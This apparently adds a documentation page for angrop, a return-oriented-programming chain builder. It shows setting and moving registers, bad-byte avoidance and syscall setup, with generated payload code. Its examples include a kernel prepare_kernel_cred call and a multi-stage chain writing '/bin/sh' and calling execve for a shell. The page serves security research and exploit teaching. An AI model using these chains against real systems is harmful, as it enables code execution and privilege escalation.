@@ -1,0 +1,270 @@
+---
+title: 'Register Control'
+description: 'Master register manipulation with set_regs() and move_regs()'
+---
+
+## Overview
+
+Register control is fundamental to ROP chain construction. angrop provides powerful primitives for setting and moving register values, which can be combined to create complex chains.
+
+## Setting Registers
+
+### Basic set_regs()
+
+The `set_regs()` method sets registers to specific values:
+
+```python
+import angr
+import angrop
+
+# Load binary and initialize
+p = angr.Project("/bin/ls")
+rop = p.analyses.ROP()
+rop.find_gadgets()
+
+# Set single register
+chain = rop.set_regs(rax=0x1337)
+
+# Set multiple registers
+chain = rop.set_regs(rax=0x1337, rbx=0x56565656)
+
+# Print the chain
+chain.print_payload_code()
+```
+
+### Example Output
+
+```python
+code_base = 0x0
+chain = b""
+chain += p64(code_base + 0xf5e2)   # pop rbx; pop r12; test eax, eax; pop rbp; cmovs eax, edx; ret 
+chain += p64(0x56565656)
+chain += p64(0x0)
+chain += p64(0x0)
+chain += p64(code_base + 0x812f)   # pop rsi; pop rbp; ret 
+chain += p64(0x1337)
+chain += p64(0x0)
+chain += p64(code_base + 0x169dd)  # mov rax, rsi; ret 
+chain += p64(code_base + 0x10a55)
+```
+
+## Moving Registers
+
+### Using move_regs()
+
+The `move_regs()` method copies values between registers:
+
+```python
+# Move value from rdx to rax
+chain = rop.move_regs(rax='rdx')
+
+chain.pp()
+```
+
+### Example Output
+
+```
+0x0000000000034573: pop rcx; ret 
+                    <preserved rax value>
+0x000000000004a1dd: pop rdi; mov edx, 0x89480002; ret 
+                    <rdx value>
+0x00000000000d5a94: mov qword ptr [rcx + 8], rdi; ret 
+                    <BV64 next_pc_1081_64>
+```
+
+This chain moves the value from `rdx` into `rax` using intermediate gadgets.
+
+## Combining Chains
+
+<Steps>
+  <Step title="Set up initial values">
+    ```python
+    import angr
+    import angrop
+
+    p = angr.Project("/bin/ls")
+    rop = p.analyses.ROP()
+    rop.find_gadgets()
+
+    # Set initial register values
+    chain = rop.set_regs(rbx=0x41414141, rcx=0x42424242)
+    ```
+  </Step>
+
+  <Step title="Add more operations">
+    ```python
+    # Chain additional register operations
+    chain += rop.set_regs(rdx=0xdeadbeef)
+    
+    # Move registers around
+    chain += rop.move_regs(rax='rbx')
+    ```
+  </Step>
+
+  <Step title="View the complete chain">
+    ```python
+    # Pretty-print for debugging
+    chain.pp()
+    
+    # Or generate exploit code
+    chain.print_payload_code()
+    ```
+  </Step>
+</Steps>
+
+## Complete Example
+
+```python
+import angr
+import angrop
+
+# Initialize
+p = angr.Project("/bin/ls")
+rop = p.analyses.ROP()
+rop.find_gadgets()
+
+# Build complex chain
+chain = rop.set_regs(rax=0x1337, rbx=0x56565656, rcx=0xdeadbeef)
+chain += rop.move_regs(rdx='rax')
+chain += rop.set_regs(rsi=0xcafebabe)
+
+# View the chain
+chain.print_payload_code()
+```
+
+## Preserving Registers
+
+When calling functions, you can preserve specific registers:
+
+```python
+# Preserve rdi register during function call
+chain = rop.func_call(
+    "prepare_kernel_cred", 
+    (0x41414141, 0x42424242), 
+    preserve_regs={'rdi'}
+)
+
+chain.pp()
+```
+
+### Output
+
+```
+0xffffffff81489752: pop rsi; ret 
+                    0x42424242
+0xffffffff8114d660: <prepare_kernel_cred>
+                    <BV64 next_pc_4280_64>
+```
+
+Notice that the first argument (`0x41414141`) is ignored because `rdi` is preserved, so the function will use whatever value is already in `rdi`.
+
+## Avoiding Bad Bytes
+
+You can specify bad bytes to avoid in your chain:
+
+```python
+# Avoid null bytes and newlines
+rop.set_badbytes([0x0, 0x0a])
+
+# This chain will not contain 0x00 or 0x0a bytes
+chain = rop.set_regs(eax=0)
+
+chain.print_payload_code()
+```
+
+angrop will automatically find alternative gadgets that don't contain the specified bad bytes.
+
+## Real-World Example: Setting Up Syscall Arguments
+
+```python
+import angr
+import angrop
+
+# Load binary
+p = angr.Project("/bin/ls")
+rop = p.analyses.ROP()
+rop.find_gadgets()
+
+# Set up for read(0, buffer, 0x100) syscall
+buffer_addr = 0x804f000
+
+chain = rop.set_regs(
+    rax=0,              # syscall number for read
+    rdi=0,              # fd = stdin
+    rsi=buffer_addr,    # buffer address
+    rdx=0x100           # count = 256 bytes
+)
+
+# Or use the built-in do_syscall method
+chain = rop.do_syscall(0, [0, buffer_addr, 0x100], needs_return=False)
+
+chain.print_payload_code()
+```
+
+## Advanced: Register Arithmetic
+
+You can also perform operations on registers:
+
+```python
+# Move register and then set another
+chain = rop.move_regs(rax='rdx')
+chain += rop.set_regs(rbx=0x1000)
+
+# The order matters - operations are applied sequentially
+chain.pp()
+```
+
+## Debugging Tips
+
+### Pretty Print
+
+Use `pp()` to see exactly what each gadget does:
+
+```python
+chain = rop.set_regs(rax=0x1337, rbx=0x5656)
+chain.pp()
+```
+
+### Payload Code
+
+Use `print_payload_code()` to get ready-to-paste Python code:
+
+```python
+chain.print_payload_code()
+```
+
+This outputs code you can directly copy into your exploit script.
+
+## Chain Composition Patterns
+
+### Pattern 1: Setup, Execute, Cleanup
+
+```python
+# Setup registers
+setup = rop.set_regs(rax=0x1337, rbx=0x2000)
+
+# Execute function
+execute = rop.func_call("dangerous_function", [0x41414141, 0x42424242])
+
+# Combine
+chain = setup + execute
+```
+
+### Pattern 2: Multi-Stage Chains
+
+```python
+# Stage 1: Write "/bin/sh" to memory
+stage1 = rop.write_to_mem(0x61b100, b"/bin/sh\x00")
+
+# Stage 2: Set up registers for execve
+stage2 = rop.set_regs(rdi=0x61b100, rsi=0, rdx=0)
+
+# Stage 3: Call execve
+stage3 = rop.func_call("execve", [0x61b100, 0, 0], needs_return=False)
+
+# Complete chain
+chain = stage1 + stage2 + stage3
+chain.print_payload_code()
+```
+
+This modular approach makes complex chains easier to build and debug.
